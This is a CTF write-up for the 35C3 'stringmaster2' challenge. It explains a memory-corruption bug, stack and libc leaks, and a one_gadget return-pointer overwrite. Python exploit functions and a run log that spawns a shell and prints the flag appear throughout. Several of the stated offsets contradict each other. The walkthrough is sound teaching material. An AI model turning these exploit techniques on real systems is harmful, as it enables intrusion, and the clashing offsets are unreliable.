# 35c3 Stringmaster2 Walkthrough

This is my Walkthrough for the stringmaster2 challenge, which I solved during the 35c3 juniors CTF. I'm trying to explain the bug and the exploitation techniques I used in a very detailed way, so that even less experienced people can understand and reimplement it :D

## Environment

Just in case you want to follow along. I'm working in a Ubuntu16.04 VM with libc-2.23 (you might have to adjust your offsets if you have a different version) and gdb with the [peda plugin](https://github.com/longld/peda).

## The Challenge

The challenge sever provides you with a zip archive as well as an IP and a port.

The archive contains three files:

    - the stringmaster2 binary
    - the source code for stringmaster2
    - a libc

The fact that we get a libc indicates that we might have to do some kind of ROP or ret2libc attack.

## Initial analysis



The source code reveals that the binary first generates two random 10 byte strings from a custom alphabet.
```c++
const string chars = "abcdefghijklmnopqrstuvwxy";
...
string from(10, '\00');
string to(10, '\00');
for (int i = 0; i < 10; ++i) {
    from[i] = chars[rand() % (chars.length() - 1)];
    to[i] = chars[rand() % (chars.length() - 1)];
}
```
It then stores a pointer to the `from` string inside of `s`.

```c++
string s(from);
```

Now the program goes into a loop, where it expects one of four possible commands:

`swap`
```c++
if (command == "swap") {
    unsigned int i1, i2;
    cin >> i1 >> i2;
    if (cin.good() && i1 < s.length() && i2 < s.length()) {
        swap(s[i1], s[i2]);
    }
    costs += 1;
```
Swap expects two integers as parameters which it uses as indices into the string1. It checks if the indices are smaller than the length of `s` and if this check succeeds it swaps the chars at the provided indices.

`replace`

```c++
else if (command == "replace") {
    char c1, c2;
    cin >> c1 >> c2;
    auto index = s.find(c1);
    cout << c1 << c2 << index << endl;
    if (index >= 0) {
        s[index] = c2;
    }
    costs += 1;
```
Replace expects two chars as parameters. It calls `find()` on `s` which will walk `s` until it finds the first occurence of the char that we provided as our first parameter and overwrites it with our second char. It also tells you the index into `s` where it has found the char you want to overwrite.

`print`
```c++
else if (command == "print") {
    cout << s << endl;
    costs += 1;
```
Print just prints the string at `s` to stdout and appends a newline.

`quit`
```c++
else if (command == "quit") {
    cout << "You lost." << endl;
    break;
```
Quit prints `You lost.\n` to stdout and exits the loop, which causes the binary to return to main where it stops execution.

Finally the program checks if `s` is the same as `to` and if this is the case  it prints a message telling you that you solved the problem and it tells you how many actions(prints, swaps and replaces) it took you.

As you can see, you won't get the flag, if the check succeeds, so you can ignore this last part. I just mentioned it for the sake of completeness.


The next thing I did was to open the binary in a dissasembler (I used [radare2](https://github.com/radare/radare2)) to see if there is any hidden functionality the author removed from the source code after compiling it. TL;DR there wasn't any.

Ok, now that we know what the program does, we can run it and play around with it, so that we get a better feeling for it.

## The Bug

After playing around with the binary for a bit, I noticed some weird
behavior when trying to replace char that doesn't exist in the string. The weird behavior is that it actually works.
```
~$ ./stringmaster2
...
String1: ehwvbivwas
String2: dxbhulsjbn


Enter the command you want to execute:
[1] swap <index1> <index2>                   (Cost: 1)
[2] replace <char1> <char2>                  (Cost: 1)
[3] print                                    (Cost: 1)
[4] quit                                              
> replace A a
Aa187
```
This indicates that it has found an "A" or `0x41` at index 184 and replaced it with "a" or `0x61`.

To verify this we can open the binary in gdb.

```
~$ gdb stringmaster2
...

gdb-peda$ break print_menu()
Breakpoint 1 at 0x133a
gdb-peda$ run
Starting program: /vagrant/35c3/pwn/stringmaster2/stringmaster2
...
String1: gijugolusq
String2: ilgjuibreg
...
```
Now we started the program so we need to find the address at which `String1` is.

```
gdb-peda$ find gijugolusq
Searching for 'gijugolusq' in: None ranges
Found 2 results, display max 2 items:
[stack] : 0x7fffffffe3b0 ("gijugolusq")
[stack] : 0x7fffffffe3f0 ("gijugolusq")
```
For some reason there are two occurences of that sting on the stack but a quick look at the dissasembly of `play()` shows that the first string at `0x7fffffffe3b0` is being used.

Let's inspect the memory around this location:
```
gdb-peda$ x/10gx 0x7fffffffe3b0
0x7fffffffe3b0:	0x756c6f67756a6967	0x00007ffff7007173
0x7fffffffe3c0:	0x00007fffffffe3d0	0x000000000000000a
0x7fffffffe3d0:	0x726269756a676c69	0x0000555555006765
0x7fffffffe3e0:	0x00007fffffffe3f0	0x000000000000000a
0x7fffffffe3f0:	0x756c6f67756a6967	0x00007ffff7007173
0x7fffffffe400:	0x00007fffffffe410	0x0000000000000007
0x7fffffffe410:	0x006563616c706572	0x0000555555556671
```
We will try to overwrite the 4 bytes at 0x7fffffffe41c. They currently are
`0x55` which is "U" in ASCII. "U" is not defined in the alphabet thus will never be in String1 and since it is a printable ASCII char it is easy for us to enter it.

```
gdb-peda$ continue
Enter the command you want to execute:
[1] swap <index1> <index2>                   (Cost: 1)
[2] replace <char1> <char2>                  (Cost: 1)
[3] print                                    (Cost: 1)
[4] quit                                              
> replace U A
UA42
gdb-peda$ continue
...
> replace U A
UA43
gdb-peda$ continue
...
> replace U A
UA44
gdb-peda$ continue
...
> replace U A
UA45
```
This should have changed the data at `0x7fffffffe418` from `0x0000555555556671` to `0x0000414141416671`. Let's check that:
```
gdb-peda$ x/gx 0x7fffffffe418
0x7fffffffe418:	0x0000414141416671
```
Yes, it worked! This means we have a an arbitrary write primitive for memory after string1.

Another thing I noticed is that we get an information leak if we enter `print` after entering `replace` with a char that is not in String1

```
gdb-peda$ c
...
> print
gijugolusq??????printeqfAAAA??0??V???fUUUU0RUUUUP?????eUUUU0XI??X????h????eUUUU?6V?j??0RUUUUP?????6$R???ԃ6?4?.??h????h?????w???0RUUUUP????ZRUUUUH?????????????????????????????????"?????????????????????????????????????+????J????Z????b?????????????????????????????????????????????????!???????d@@UUUU8	p???    0RUUUU
                                                                                                                                      ?
??y??????????????w?0??V????                                                                                                            ?
                           `??A86_64/vagrant/35c3/pwn/stringmaster2/stringmaster2LANG=en_US.UTF-8LC_CTYPE=en_US.UTF-
```
As you can see, the leak starts with String1 and ends with some environment variables which are stored on the stack.
This indicated that we are leaking some stack data and this can be very handy to defeat ASLR and PIC.
Since the leak starts with String1, it can only com from one of two locations: the first occurence of String1
or the second. And a comparison of the area after the two occurences and the leak reveals that the the
stack after the second is being leaked. So now we know what we leak but we still don't know what we can do with this.
What we need is some value on the stack that has a static offset from the libc base. So as long as we are
able to leak this address from the stack and we know the offset into libc we can just
subtract the offset from the leak and get the base of libc.
I did this with trail and error. First I used the `vmmap` command in gdb to get the base of libc.
Then I took one address from the leak that was close to the libc base and subtracted the base from it. I saved the result (let's call this `c`) and reran the program.
All I needed to do now is use the address thats at the same offset as the one that I used before, subtract
`c` from it and check if the resulting value is equal to the base address of libc. I did that with a bunch
of addresses from the leak until I found one at `0x7e` bytes after String1 that apparently is
always exactly `0x20830` bytes larger than the base of libc.
Now we have a way of calculating the base of libc but this works only for our local libc.
To port this to work for the remote libc we first need to
find out what's located 0x20830 after the base of our local libc.
```
~$ ldd stringmaster2|grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f52b73d2000)
~$ objdump -d /lib/x86_64-linux-gnu/libc.so.6|grep -A 5 20830:
  20830:	89 c7                	mov    %eax,%edi
  20832:	e8 f9 97 01 00       	callq  3a030 <exit@@GLIBC_2.2.5>
  20837:	31 d2                	xor    %edx,%edx
  20839:	e9 3b ff ff ff       	jmpq   20779 <__libc_start_main@@GLIBC_2.2.5+0x39>
  2083e:	48 8b 05 cb 8e 3a 00 	mov    0x3a8ecb(%rip),%rax        # 3c9710 <argp_program_version_hook@@GLIBC_2.2.5+0x1b0>
  20845:	48 c1 c8 11          	ror    $0x11,%rax
```
The instuctions at offset 0x20830 are
```
	mov    %eax,%edi
  callq  3a030 <exit@@GLIBC_2.2.5>
```
If we can find the offset at which these instructions are in the libc of the remote server, we can use that offset to calculate the base of the remote libc.
```
~$ objdump -d libc-2.27.so|grep -A 1 "mov    %eax,%edi" |grep -B 1 exit
   21b97:	89 c7                	mov    %eax,%edi
   21b99:	e8 82 15 02 00       	callq  43120 <exit@@GLIBC_2.2.5>
```
Here it is, the remote offset is 0x21b97

What we still need is a way to leak the return pointer so that we can `replace` the bytes in our actual return pointer with some other address that we want to jump to in order for us to take over the control flow of the program. Luckily the return ponter is also in our leak. The return pointer is exactly `0x6e` bytes after String1.

Now we need to build an exploit around that.

## The Exploit

First of all we should check the security mechanisms that are compiled into the executable so that we know what we are working with.
To do that we can use the `checksec` command in gdb-peda:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
We can ignore the cannary because we won't overflow the stack. And NX means that the Stack is marked
Non-executable but our write primitive is way to instable to write shellcode to the stack anyway.
PIE (Position Independent Code) means that the `__TEXT` segments loding address will be randomized each
time we execute. And RELO: FULL means that the address of the GOT(Global Offset Table) will also be
randomized thus we won't we able to just overwrite some entry in the GOT without leaking it first. Further
more we can assume that the remote server has ASLR (Address Space Layout Randomization) enabled so we will
have to leak some libc addresses anyway in order to get libc's base for a ret2libc or Rop attack.

### Structure

What we need:
  - two info leaks (return pointer and libc address)
  - a write primitive
  - a ropchain to get a shell

#### Info leak
1. Trigger stack print

2. Find the value thats exactly `0x79` bytes after string1  --> return pointer

3. Find the value thats exactly `0x88` bytes after string1 and subtract `0x20830` from it --> libc base


Here is some code that does this
```python
def leak():
    leaks = []
    p.read()
    p.sendline("replace ? ?")
    p.read()
    p.sendline("print")
    p.readuntil(s1)
    p.read(0x6e)
    leaks.append(u64(p.read(6)[:8].strip().ljust(8, "\x00"))) # return ptr at offset 0x79 from s1
    p.read(0xa)
    leaks.append(u64(p.read(6)[:8].strip().ljust(8, "\x00"))) # libc address at offset 0x88 from s1
    p.read()
    return leaks
```

We might want to have a function that we can use to only leak the return pointer, so that we can check
if we've overwritten it already or not.
```python
def getRetPtr():
    sleep(0.2)
    p.sendline("print")
    p.readuntil(s1)
    p.read(0x6e)
    leak = u64(p.read(6)[:8].strip().ljust(8, "\x00"))
    p.read()
    return leak
```

#### Write primitive
We can use these functions
```python
def write(old, new, count):
    for i in range(count):
        sleep(0.2)
        p.sendline("replace %s %s" % (old, new))

def kindaStableWrite(old, new, count):
    write(old, "?", count)
    write("?", old, count-1)
    write("?", new, 1)

```
as a wrapper around our instable write using `replace` to overwrite the return pointer.
Let's assume we have this string in memory:
```
ajdeitk37adfna
```
and we want to overwrite the 3rd "a" with "A". So we would call
`kindaStableWrite("a", "A", 3)`
What `kindaStableWrite` does is replace all "a"'s with "?" which I found to be a unique charackter on the stack. Well most of the time (I say most of the time because the values on the
stack are not stable and can change a lot especially with PIE enabled). Anyway we first overwrite all "a"'
with "?"'s. Then we overwrite all "?"'s-1 with "a"'s again this results in the "a" that we actually want to
overwrite being the only "?". And then we overwrite the only "?" with "A". I'm sure that there are some
better ways of stabilizing the write and I'd love to hear about them so feel free to Dm me on twitter @A2nkF_
if you have a nicer way of doing it ;D.


#### Ropchain
Since our write primitive is fairly instable we will use a oneshot gadget instead of a ROP-chain. A oneshot gadget consists (as the name indicates) of only one gadget. The idea is to jump to a location in libc, where something like
```c
execve("/bin/sh", rsp+0x50, environ)
```
is called and hope that the stack is setup correctly for it to spawn a shell.
You can find these gadgets using [one_gadget](https://github.com/david942j/one_gadget).

One important thing to remember is that our libc is not the same as the servers, so we have to find a oneshot gadget for our local machine, and one for the remote machine.

We can use these for the remote server:

```
~$ one_gadget libc-2.27.so
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
and these for the our local binary:
```
~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

All that is left to do now is to loop over each byte of the return pointer and try to overwrite it with the corresponding byte from our oneshot gadget.
```python
for i in range(0, 6):
    old = getRetPtr()
    for j in range(2, 100):
        log.info("------> Overwriting byte %d: 0x%x with 0x%x at offset %d" % (i, ord(ret_chars[i]), ord(oneshot_chars[i]), j))
        write(ret_chars[i], oneshot_chars[i], j)
        new = getRetPtr()
        if old != new:
            log.success("WORKED!!! New pointer: " + hex(new))
            break
        else:
            log.info("Guessed wrong...")
```
If we then send `quit` it will cause a return which will jump to our oneshot gadget.

When running our exploit now we get this:
```
~$ ./exploit.py
[+] Opening connection to 35.207.132.47 on port 22225: Done
[*] Mapping binary
[*] '/vagrant/35c3/pwn/stringmaster2/stringmaster2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] String1: dreqwjwtag, String2: ucahakpdwj
[+] Leaked return pointer: 0x564f1acc75fb
[+] Leaked libc address: 0x7f2b142c2b97
[+] Calculated libc base: 0x7f2b142a1000
[+] Oneshot is at: 0x7f2b143ab38c
[*] Attepting overwrite...
[*] ------> Overwriting byte 0: 0xfb with 0x8c at offset 2
[+] WORKED!!! New pointer: 0x564f1acc758c
[*] ------> Overwriting byte 1: 0x75 with 0xb3 at offset 2
[+] WORKED!!! New pointer: 0x564f1accb38c
[*] ------> Overwriting byte 2: 0xcc with 0x3a at offset 2
[*] Guessed wrong...
[*] ------> Overwriting byte 2: 0xcc with 0x3a at offset 3
[+] WORKED!!! New pointer: 0x564f1a3ab38c
[*] ------> Overwriting byte 3: 0x1a with 0x14 at offset 2
[*] Guessed wrong...
[*] ------> Overwriting byte 3: 0x1a with 0x14 at offset 3
[+] WORKED!!! New pointer: 0x564f143ab38c
[*] ------> Overwriting byte 4: 0x4f with 0x2b at offset 2
[*] Guessed wrong...
[*] ------> Overwriting byte 4: 0x4f with 0x2b at offset 3
[+] WORKED!!! New pointer: 0x562b143ab38c
[*] ------> Overwriting byte 5: 0x56 with 0x7f at offset 2
[*] Guessed wrong...
[*] ------> Overwriting byte 5: 0x56 with 0x7f at offset 3
[+] WORKED!!! New pointer: 0x7f2b143ab38c
[+] WE ARE IN CONTROL!!! RETURN TO ONESHOT AT 0X7f2b143ab38c
[+] Spawning shell...
[*] Switching to interactive mode
You lost.
$ cat flag.txt
35C3_fb23c497dbbf35b0f13b9d16311fa59cf8ac1b02
$
```
You can find the full exploit in `exploit.py`. Note that you might have to tun it multiple times because the exploit isn't too stable.
Hopefully I was able to help at least some people understanding this challenge and the exploit. Feel free to dm me @A2nkF_ on twitter if you have any questions or if you've found some mistakes ;P
